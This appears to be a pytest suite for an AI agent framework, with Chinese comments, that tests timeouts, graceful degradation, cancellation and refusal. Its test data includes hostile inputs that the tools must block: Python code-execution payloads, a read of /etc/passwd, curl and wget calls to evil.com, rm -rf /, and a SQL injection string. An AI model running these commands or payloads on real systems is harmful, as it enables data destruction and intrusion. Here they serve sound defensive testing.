# -*- coding: utf-8 -*-
"""L5-2 故障恢复与 L5-4 边界拒答：超时、降级、限流、脏数据、取消与拒答。

指南 L5-2 的判据是「崩了之后的行为是否符合设计」，而不是「会不会崩」——
每个故障用例都必须事先写明预期行为，否则无法判定。
"""

from __future__ import annotations

import asyncio
import time

import pytest

from fixtures import require_module

from framework.case import case, require, require_eq


# ══════════════════════════════════════════════════════════════
# L5-2.1 工具超时
# ══════════════════════════════════════════════════════════════

@case(
    "L5-2.1",
    "工具超时后不卡死：Hook 调度在超时点返回 TIMEOUT 状态",
    title="工具超时后系统卡死",
    dimension="故障恢复 - 工具超时",
    severity="P0",
    threshold="100% 在超时点后有限时间内返回",
    counter_example="dispatch 永久阻塞 → 端到端请求挂起",
    tags=("故障",),
)
def test_tool_timeout_returns_promptly():
    import threading

    from domains.hook.application.hook_runtime import (
        HookDefinition,
        HookInvocation,
        HookRuntime,
    )
    from domains.hook.domain.hook_definitions import HookEvent
    from domains.hook.domain.resource_models import HookPolicy, HookSnapshot

    timeout = 0.3
    # 用 Event.wait 而非 time.sleep：sleep 的线程在超时后仍会占着 GIL
    # 直到睡满，与后续用例争抢 CPU，让本用例的耗时断言失真。
    # Event.wait 可被立即唤醒，线程在超时后马上退出。
    release = threading.Event()

    def _slow(_inv):
        release.wait(10)
        return "done"

    snapshot = HookSnapshot(
        hooks={"PreToolUse": [HookDefinition(name="slow", handler=_slow, timeout=timeout)]}
    )
    started = time.monotonic()
    trace = HookRuntime(snapshot, HookPolicy()).dispatch(
        HookInvocation(event=HookEvent.PRE_TOOL_USE, tool_name="x")
    )
    elapsed = time.monotonic() - started
    release.set()  # 放行后台线程，避免残留

    require("timeout" in trace.statuses, "未产生 TIMEOUT 状态", detail=str(trace.statuses))
    require(
        elapsed < timeout + 0.5,
        f"超时后阻塞了 {elapsed:.2f}s，未在超时点及时返回（阈值 {timeout + 0.5:.2f}s）",
    )


@case(
    "L5-2.1",
    "超时后不编造结果：裁决明确标记为 DENY 而非放行",
    title="超时后编造或静默放行",
    dimension="故障恢复 - 工具超时",
    severity="P0",
    threshold="100%",
    counter_example="超时后 decision=CONTINUE 且无失败标记 → 故障被当作成功",
    tags=("故障", "P0"),
)
def test_timeout_does_not_fabricate_success():
    import threading

    from domains.hook.application.hook_runtime import (
        HookDefinition,
        HookInvocation,
        HookRuntime,
    )
    from domains.hook.domain.hook_definitions import HookEvent
    from domains.hook.domain.outputs import HookDecisionAction
    from domains.hook.domain.resource_models import HookPolicy, HookSnapshot

    release = threading.Event()

    def _slow(_inv):
        release.wait(5)
        return "done"

    snapshot = HookSnapshot(
        hooks={"PreToolUse": [HookDefinition(name="slow", handler=_slow, timeout=0.2)]}
    )
    trace = HookRuntime(snapshot, HookPolicy()).dispatch(
        HookInvocation(event=HookEvent.PRE_TOOL_USE)
    )
    release.set()  # 放行后台线程，避免残留
    require(
        trace.decision is HookDecisionAction.DENY,
        f"超时后裁决为 {trace.decision}，未 fail-close → 故障被静默当作成功",
    )


# ══════════════════════════════════════════════════════════════
# L5-2.2 服务不可用
# ══════════════════════════════════════════════════════════════

@case(
    "L5-2.2",
    "MCP 依赖不可用时优雅降级：登记流程返回空结果而非抛异常",
    title="依赖不可用时未优雅降级",
    dimension="故障恢复 - 服务不可用",
    severity="P1",
    threshold="100% 不抛异常",
    counter_example="MCP 服务挂掉导致应用装配崩溃",
    tags=("故障",),
)
def test_mcp_unavailable_degrades():
    from domains.agent.application.toolkit.mcp_tool_registration import AgentMcpToolRegistrar
    from domains.tool.core.application.toolkit import Toolkit

    class _BrokenManager:
        class mcp_registry:  # noqa: N801
            @staticmethod
            def names():
                raise ConnectionError("MCP 服务不可达")

    try:
        result = asyncio.run(
            AgentMcpToolRegistrar(_BrokenManager()).register(Toolkit(), None)
        )
    except Exception as exc:  # noqa: BLE001
        require(
            False,
            f"MCP 服务不可用导致异常向上传播：{type(exc).__name__}: {exc}",
            detail="MCP 为可选能力，其不可用不应阻断整体装配",
        )
    else:
        require(
            bool(result.warnings) or not bool(result),
            "MCP 服务不可用既未登记工具也未记录告警 → 故障被静默吞掉",
            detail=f"result={result}",
        )


@case(
    "L5-2.2",
    "检查点 sink 不可用时主流程不中断（旁路能力）",
    title="检查点依赖故障导致主流程中断",
    dimension="故障恢复 - 服务不可用",
    severity="P1",
    threshold="100% 不抛出",
    counter_example="可观测性组件故障导致对话流程崩溃",
    tags=("故障",),
)
def test_checkpoint_sink_failure_isolated():
    from domains.runtime.application.orchestrators.session_turn_checkpoint import (
        SessionTurnCheckpointCoordinator,
    )

    class _BrokenSink:
        def emit(self, *_a, **_k):
            raise OSError("磁盘满")

    coordinator = SessionTurnCheckpointCoordinator(_BrokenSink())
    try:
        asyncio.run(coordinator.publish_turn_checkpoint("s1", turn_id="t1", boundary="pre"))
    except Exception as exc:  # noqa: BLE001
        require(
            False,
            f"检查点 sink 故障导致异常传播：{type(exc).__name__}: {exc}",
            detail="可观测性为旁路能力，其故障不应影响主流程",
        )


# ══════════════════════════════════════════════════════════════
# L5-2.4 脏数据输入
# ══════════════════════════════════════════════════════════════

@case(
    "L5-2.4",
    "脏数据不导致流程崩溃：内置计算工具对 9 类脏输入全部安全处理",
    title="脏输入导致计算工具崩溃",
    dimension="故障恢复 - 脏数据输入",
    severity="P1",
    threshold="≥ 95%",
    counter_example="任一脏输入抛出未捕获异常 → 工具调用链断裂",
    tags=("故障", "脏数据"),
)
def test_calculator_dirty_input(dirty_documents):
    from domains.tool.builtin.calculator import CalculatorTool

    tool = CalculatorTool()
    crashed = []
    handled = 0
    for label, content in dirty_documents.items():
        try:
            result = tool.run({"input": content})
            handled += 1
            if not isinstance(result, str):
                crashed.append(f"{label}: 返回非字符串 {type(result).__name__}")
        except Exception as exc:  # noqa: BLE001
            crashed.append(f"{label}: {type(exc).__name__}")

    require(
        not crashed,
        f"{len(crashed)}/{len(dirty_documents)} 类脏输入未被安全处理",
        detail="; ".join(crashed[:5]),
    )
    require(handled == len(dirty_documents), "并非全部脏输入都被处理")


@case(
    "L5-2.4",
    "计算工具拒绝任意代码执行（AST 沙箱），不执行 import/os.system",
    title="计算工具存在代码执行漏洞",
    dimension="故障恢复 - 脏数据输入",
    severity="P0",
    threshold="100% 拒绝",
    counter_example="__import__('os').system('rm -rf /') 被执行 → 任意代码执行",
    tags=("对抗", "P0"),
)
@pytest.mark.parametrize(
    "payload",
    [
        "__import__('os').system('whoami')",
        "open('/etc/passwd').read()",
        "exec('import os')",
        "eval('1+1')",
        "().__class__.__bases__[0].__subclasses__()",
        "globals()['__builtins__']",
    ],
)
def test_calculator_blocks_code_execution(payload):
    from domains.tool.builtin.calculator import CalculatorTool

    result = CalculatorTool().run({"input": payload})
    require(
        isinstance(result, str) and not result.strip().lstrip("-").isdigit(),
        f"计算工具执行了任意代码并返回了结果：{result!r}",
        detail=f"载荷：{payload}",
    )


@case(
    "L5-2.4",
    "计算工具对空表达式给出明确错误而非崩溃或返回空",
    title="空表达式处理不当",
    dimension="故障恢复 - 脏数据输入",
    severity="P1",
    threshold="100%",
    counter_example="空输入返回空字符串 → 模型误以为计算成功",
    tags=("边界",),
)
def test_calculator_empty_input():
    """空表达式应给出明确错误，而非泄漏底层异常。

    已知缺陷：仅 strip() 为空时才提示，空格输入会把 Python 原始异常
    （unexpected indent）直接返回给调用方与用户。
    """
    from domains.tool.builtin.calculator import CalculatorTool

    for payload in ("", None):
        result = CalculatorTool().run({"input": payload})
        require(
            "错误" in result or "不能为空" in result,
            f"空输入 {payload!r} 未给出明确错误提示：{result!r}",
        )

    # 纯空白输入：不应泄漏 Python 底层异常
    result = CalculatorTool().run({"input": "   "})
    require(
        "unexpected indent" not in result,
        f"纯空白输入泄漏了 Python 底层异常到用户可见输出：{result!r}",
        detail="应在 strip() 后判空并返回明确错误，而非透传 SyntaxError 文本",
    )


@case(
    "L5-2.4",
    "终端工具拒绝白名单外的命令（不执行任意子进程）",
    title="终端工具执行白名单外命令",
    dimension="故障恢复 - 脏数据输入",
    severity="P0",
    threshold="100% 拒绝",
    counter_example="curl/wget 等未列入白名单的命令被执行",
    tags=("对抗", "P0"),
)
@pytest.mark.parametrize(
    "command", ["curl http://evil.com", "wget http://evil.com", "rm -rf /", "shutdown now"]
)
def test_terminal_tool_rejects_non_whitelisted(command):
    from domains.tool.builtin.terminal_tool import TerminalTool

    result = TerminalTool(workspace=".").run({"command": command})
    require(
        "不允许" in result or "拒绝" in result or "❌" in result,
        f"终端工具未拒绝非白名单命令 {command!r}：{result[:120]!r}",
    )


@case(
    "L5-2.4",
    "规则匹配对脏输入不抛异常（脏数据不导致防护失效）",
    title="脏输入导致规则防护抛异常",
    dimension="故障恢复 - 脏数据输入",
    severity="P0",
    threshold="100% 不抛异常",
    counter_example="规则匹配遇 bytes/int 抛 TypeError → 安全防护被绕过",
    tags=("故障", "脏数据", "P0"),
)
def test_rule_matching_dirty_input_safe():
    from domains.permission.domain.policy import default_rules

    rules = default_rules()
    dirty = [None, b"bytes", 123, [], {}, 3.14]
    crashed = []
    for value in dirty:
        try:
            for rule in rules:
                rule.matches("shell_command", value)
        except Exception as exc:  # noqa: BLE001
            crashed.append(f"{type(value).__name__}: {type(exc).__name__}")

    require(
        not crashed,
        f"{len(crashed)}/{len(dirty)} 类脏输入导致规则匹配抛异常 → 攻击者可用非字符串输入绕过防护",
        detail="; ".join(crashed),
    )


@case(
    "L5-2.4",
    "记忆存储对脏数据安全降级，不污染整体流程",
    title="脏数据污染记忆存储",
    dimension="故障恢复 - 脏数据输入",
    severity="P1",
    threshold="≥ 95%",
    counter_example="脏数据导致数据库损坏或查询崩溃",
    tags=("故障", "脏数据"),
)
def test_memory_dirty_input_safe(sqlite_store):
    store = sqlite_store("dirty.db")
    ts = int(time.time())
    dirty_values = ["", "   ", "含\x00控制符", "超长" * 5000, "'; DROP TABLE memories; --"]

    crashed = []
    for idx, content in enumerate(dirty_values):
        try:
            store.add_memory(f"d{idx}", "alice", content, "working", ts, 0.5)
        except Exception as exc:  # noqa: BLE001
            crashed.append(f"#{idx}: {type(exc).__name__}")

    require(not crashed, f"{len(crashed)} 类脏数据导致写入异常", detail="; ".join(crashed))
    require(
        store.get_database_stats()["memories_count"] >= len(dirty_values),
        "脏数据未完整写入 → 存在静默丢弃",
    )


# ══════════════════════════════════════════════════════════════
# L5-3 长程一致性
# ══════════════════════════════════════════════════════════════

@case(
    "L5-3.1",
    "取消作用域状态机正确：完成后不可重复完成，状态终态唯一",
    title="终态可被重复进入",
    dimension="长程一致性 - 目标保持",
    severity="P1",
    threshold="100%",
    counter_example="已完成的状态可被再次置为完成 → 重复执行已完成步骤",
    tags=("故障",),
)
def test_cancel_scope_terminal_state():
    from domains.agent.domain.aggregates.cancellation import (
        TurnCancelScope,
        TurnCancelState,
    )

    scope = TurnCancelScope(session_id="s1")
    require(scope.complete() is True, "首次 complete 应返回 True")
    require(scope.complete() is False, "终态被重复进入：第二次 complete 仍返回 True")
    require(scope.state is TurnCancelState.COMPLETED, "终态不正确")


@case(
    "L5-3.3",
    "用户叫停后干净转向：已终止的 turn 不可被重新取消",
    title="叫停后残留旧路径动作",
    dimension="长程一致性 - 中途纠偏",
    severity="P1",
    threshold="100%",
    counter_example="已取消的 turn 再次 cancel 返回 True → 旧路径仍有动作",
    tags=("故障",),
)
def test_cancel_is_terminal():
    from domains.agent.domain.aggregates.cancellation import TurnCancelScope

    scope = TurnCancelScope(session_id="s1")
    require(scope.cancel("stop") is True, "首次 cancel 应返回 True")
    require(scope.cancel("stop again") is False, "已取消的 turn 再次 cancel 返回 True → 存在残留动作")


@case(
    "L5-3.3",
    "父作用域已终止时新建子作用域直接为取消态（不产生孤儿运行作用域）",
    title="父终止后子作用域仍运行",
    dimension="长程一致性 - 中途纠偏",
    severity="P1",
    threshold="100%",
    counter_example="父已取消但新建子仍为 RUNNING → 旧路径任务继续执行",
    tags=("故障",),
)
def test_child_of_dead_parent_born_cancelled():
    from domains.agent.domain.aggregates.cancellation import (
        TurnCancelScope,
        TurnCancelState,
    )

    parent = TurnCancelScope(session_id="root")
    parent.cancel("gone")
    child = TurnCancelScope(parent)
    require(
        child.state is TurnCancelState.CANCELLED,
        f"父已取消但新建子作用域状态为 {child.state} → 产生孤儿运行作用域",
    )
    require_eq(child.reason, "gone", "子作用域继承的取消原因")


@case(
    "L5-3.2",
    "已取消作用域的等待立即返回，不挂起（避免长程任务永久阻塞）",
    title="已取消作用域等待挂起",
    dimension="长程一致性 - 约束保持",
    severity="P1",
    threshold="100% 立即返回",
    counter_example="wait_cancelled 在已取消时仍挂起 → 线程永久占用",
    tags=("故障",),
)
def test_wait_cancelled_returns_immediately():
    from domains.agent.domain.aggregates.cancellation import TurnCancelScope

    scope = TurnCancelScope(session_id="s1")
    scope.cancel("done")

    started = time.monotonic()
    asyncio.run(scope.wait_cancelled())
    elapsed = time.monotonic() - started
    require(
        elapsed < 0.5,
        f"已取消作用域的 wait_cancelled 阻塞了 {elapsed:.2f}s → 长程任务被挂起",
    )


@case(
    "L5-3.3",
    "已取消作用域抛出 CancelledError，使中断能被上层捕获",
    title="已取消作用域不抛出取消信号",
    dimension="长程一致性 - 中途纠偏",
    severity="P1",
    threshold="100%",
    counter_example="已取消仍继续执行 → 用户叫停无效",
    tags=("故障",),
)
def test_raise_if_cancelled():
    from domains.agent.domain.aggregates.cancellation import TurnCancelScope

    scope = TurnCancelScope(session_id="s1")
    scope.cancel("user_stop")
    with pytest.raises(asyncio.CancelledError):
        scope.raise_if_cancelled()

    alive = TurnCancelScope(session_id="s2")
    require(alive.raise_if_cancelled() is None, "运行中的作用域不应抛异常")


@case(
    "L5-3.4",
    "可中断睡眠对负数时长拒绝（非法约束不静默接受）",
    title="非法睡眠时长被接受",
    dimension="长程一致性 - 约束保持",
    severity="P1",
    threshold="100%",
    counter_example="负数时长被静默接受 → 约束被绕过",
    tags=("边界",),
)
def test_interruptible_sleep_rejects_negative():
    mod = require_module(
        "domains.agent.domain.aggregates.interruption",
        hint="可中断睡眠依赖 agent 消息值对象，被前向引用缺陷阻断。",
    )

    with pytest.raises(ValueError):
        asyncio.run(mod.interrupt_sleep(-1.0))


@case(
    "L5-3.1",
    "取消作用域在构造时生成 turn_id（长程任务的唯一标识）",
    title="取消作用域未生成 turn_id",
    dimension="长程一致性 - 目标保持",
    severity="P1",
    threshold="100%",
    counter_example="turn_id 恒为 None → 无法归因到具体轮次，长程一致性不可验证",
    tags=("黄金",),
)
def test_session_id_inheritance():
    from domains.agent.domain.aggregates.cancellation import TurnCancelScope

    parent = TurnCancelScope(session_id="session-abc")
    child = TurnCancelScope(parent, message_id="m1")
    require_eq(child.session_id, "session-abc", "子作用域继承的 session_id")
    require(
        child.turn_id,
        "子作用域 turn_id 为 None：长程任务的轮次标识缺失，"
        "无法把 Trace / Token / 中断归因到具体轮次（L3-2.2 归因与 L5-3 一致性均受影响）",
    )
    require(
        child.turn_id != parent.turn_id,
        f"父子作用域 turn_id 相同（均为 {child.turn_id!r}）→ 无法区分轮次",
    )


# ══════════════════════════════════════════════════════════════
# L5-4 边界与拒答
# ══════════════════════════════════════════════════════════════

@case(
    "L5-4.3",
    "非法操作类型被拒绝而非静默降级为放行",
    title="非法操作类型被静默放行",
    dimension="边界与拒答 - 越界请求",
    severity="P0",
    threshold="100%",
    counter_example="未知操作类型被当作低风险处理 → 越权请求通过",
    tags=("对抗", "P0"),
)
def test_unknown_operation_type_handled():
    from domains.permission.domain.contracts import RiskLevel
    from domains.permission.domain.policy import default_rules

    rules = default_rules()
    rule = next((r for r in rules if r.matches("完全不存在的操作", "任意目标")), None)
    if rule is None:
        pytest.skip("未知操作类型无规则命中（视为默认拒绝，符合预期）")
    require(
        rule.risk_level is not RiskLevel.LOW,
        f"未知操作类型被判为 LOW 风险（{rule.action}）→ 越权请求可能被放行",
    )


@case(
    "L5-4.1",
    "不存在的技能被明确报告为 None，不返回近似匹配",
    title="不存在的技能返回近似匹配",
    dimension="边界与拒答 - 能力边界",
    severity="P1",
    threshold="100%",
    counter_example="查询不存在的技能返回一个「最接近」的技能 → 加载错误指令",
    tags=("拒答",),
)
def test_missing_skill_returns_none(write_skill, skill_root):
    from domains.skill.service.skill_registry import SkillRegistry

    write_skill("real_skill", "真实存在的技能")
    registry = SkillRegistry([skill_root]).load()
    require(registry.get("不存在的技能") is None, "不存在的技能返回了非 None 值")
    require("不存在的技能" not in registry, "不存在的技能出现在包含判断中")


@case(
    "L5-4.2",
    "查询不存在的记忆明确返回 None，不返回其他记忆",
    title="不存在的记忆被模糊返回",
    dimension="边界与拒答 - 能力边界",
    severity="P1",
    threshold="100%",
    counter_example="查不存在的 ID 返回了别的记忆 → 事实性错误",
    tags=("拒答",),
)
def test_missing_memory_returns_none(sqlite_store):
    store = sqlite_store("missing.db")
    store.add_memory("exists", "alice", "存在的内容", "working", int(time.time()), 0.5)
    require(store.get_memory("does_not_exist") is None, "不存在的记忆返回了非 None 值")


@case(
    "L5-4.1",
    "未配置的记忆域在遗忘时被明确报告，而非静默成功",
    title="未配置域的遗忘被静默忽略",
    dimension="边界与拒答 - 能力边界",
    severity="P1",
    threshold="100% 明确报告",
    counter_example="未配置域的遗忘报告成功 → 用户误以为数据已删除",
    tags=("拒答", "合规"),
)
def test_unconfigured_scope_reports_error(tmp_path):
    from domains.memory.application.memory_runtime_service import (
        MemoryRuntimeService,
        MemoryRuntimeSettings,
    )

    service = MemoryRuntimeService(
        MemoryRuntimeSettings(enabled=True, user_memory_file=tmp_path / "u.json")
    )
    report = service.forget("project", "m1")  # project 域未配置落盘文件
    require(
        report.store_errors,
        "未配置的记忆域遗忘时未报告错误 → 用户可能误以为数据已删除（合规风险）",
        detail=f"removed_ids={report.removed_ids}, fully_removed={report.fully_removed}",
    )


@case(
    "L5-4.3",
    "LSP 未配置时不启动任何进程（配置不足安全降级）",
    title="LSP 配置不足时仍尝试启动",
    dimension="边界与拒答 - 能力边界",
    severity="P2",
    threshold="100% 安全降级",
    counter_example="配置不足时抛异常 → TUI 启动被阻断",
    tags=("边界",),
)
def test_lsp_inert_without_config():
    from domains.tool.lsp._types import LSPTools

    lsp = LSPTools()
    require(lsp.available is False, "未配置时 available 应为 False")
    require(
        asyncio.run(lsp.start()) is False,
        "未配置时 start() 返回 True → 声称已启动实际未启动",
    )